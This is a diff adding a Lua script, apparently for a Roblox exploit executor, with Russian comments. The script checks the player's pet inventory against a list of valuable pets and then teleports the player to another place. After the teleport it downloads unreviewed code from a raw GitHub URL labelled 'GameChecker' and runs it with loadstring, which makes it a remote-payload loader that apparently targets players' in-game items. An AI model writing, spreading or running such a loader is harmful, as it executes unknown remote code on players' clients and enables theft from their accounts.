@@ -1,0 +1,84 @@
+if getgenv().scriptAlreadyRan then
+    warn("⚠️ Script already ran.")
+    return
+end
+getgenv().scriptAlreadyRan = true
+
+repeat task.wait() until game:IsLoaded()
+
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+
+-- Список ценных питомцев (если хотя бы один есть — НЕ телепортируем)
+local PET_WHITELIST = {
+    "Raccoon", "T-Rex", "Fennec Fox", "Dragonfly", "Butterfly", "Disco Bee",
+    "Mimic Octopus", "Queen Bee", "Spinosaurus", "Kitsune", "French Fry Ferret",
+    "Headless Horseman", "Brontosaurus", "Dragon", "Frost Dragon", "Goose",
+    "Elephant", "Squid", "Red-Nosed Reindeer", "Wendigo", "Panda", "Mummy",
+    "Hydra", "Reaper", "Goblin Miner", "Trapdoor Spider", "Ice Golem",
+    "Christmas Spirit", "Chimera", "Luminous Sprite", "Krampus",
+}
+
+-- Модуль с данными игрока
+local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
+
+-- Проверка наличия хотя бы одного ценного питомца
+local hasValuablePet = false
+
+for _, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+    local petName = petData.PetType
+    if petName then
+        for _, wlName in ipairs(PET_WHITELIST) do
+            if petName == wlName or string.find(petName, wlName, 1, true) then
+                hasValuablePet = true
+                break
+            end
+        end
+        if hasValuablePet then break end
+    end
+end
+
+if hasValuablePet then
+    print("Найден ценный питомец → остаёмся здесь")
+    return
+end
+
+-- Нет ценных питомцев → телепорт + запуск скрипта на новом месте
+warn("Нет ценных питомцев → телепорт в плейс 109983668079237")
+
+local success, err = pcall(function()
+    TeleportService:Teleport(109983668079237, player)
+end)
+
+if not success then
+    warn("Телепорт не удался: " .. tostring(err))
+    return
+end
+
+-- Ждём полной загрузки нового места
+game.Loaded:Wait()
+
+-- Загружаем и выполняем скрипт
+local scriptUrl = "https://raw.githubusercontent.com/Scripts777/HuTao/refs/heads/main/GameChecker"
+
+local codeSuccess, code = pcall(function()
+    return game:HttpGet(scriptUrl, true)
+end)
+
+if codeSuccess and code and code ~= "" then
+    local func, loadErr = loadstring(code)
+    if func then
+        local runSuccess, runErr = pcall(func)
+        if runSuccess then
+            print("Скрипт GameChecker успешно загружен и запущен")
+        else
+            warn("Ошибка при выполнении скрипта: " .. tostring(runErr))
+        end
+    else
+        warn("Ошибка в loadstring: " .. tostring(loadErr))
+    end
+else
+    warn("Не удалось загрузить скрипт: " .. tostring(code))
+end
